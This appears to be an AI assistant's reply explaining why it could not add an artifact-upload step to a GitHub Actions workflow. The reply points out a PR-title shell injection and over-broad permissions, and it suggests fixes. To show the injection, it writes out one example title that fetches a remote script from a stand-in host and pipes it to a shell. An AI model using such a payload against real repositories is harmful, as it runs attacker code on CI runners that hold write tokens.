I couldn't add the step. Two things got in the way:

1. **I can't edit files in this session.** I only have read and search tools here, so I can't write the change myself.
2. **The workflow has no tests or build to attach the step to.** `.github/workflows/deploy.yml` is the only workflow, and all of it is this:

```yaml
---
name: deploy

on:
  pull_request:

permissions: write-all

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "Title is ${{ github.event.pull_request.title }}"
```

There's no test step and no build step, so there's no build artifact to upload yet.

**Two security problems in this file, worth fixing first:**

- **Line 14 lets anyone who opens a PR inject shell commands.** The PR title is pasted straight into the shell script, so a title like `"; curl evil.sh | sh #` would run on the runner. Pass it through an environment variable instead:
  ```yaml
  - env:
      PR_TITLE: ${{ github.event.pull_request.title }}
    run: printf 'Title is %s\n' "$PR_TITLE"
  ```
- **Line 7, `permissions: write-all`, gives the job far more access than it needs.** Combined with the injection above, an attacker could do a lot with that token. For checkout, build, test and upload, `contents: read` is enough.

**Once you add test and build steps,** the upload step looks like this, placed after them:

```yaml
      - run: <your test command>
      - run: <your build command>
      - name: Upload build artifact
        uses: actions/upload-artifact@v4
        with:
          name: build
          path: <build output dir, e.g. dist/>
          if-no-files-found: error
```

Steps run in order and the job stops at the first failure, so the upload only happens if the tests pass.

If you tell me your test and build commands and where the build output goes, I can write out the full corrected `deploy.yml` for you to paste in. Or you can turn on edit permissions and I'll make the change directly.
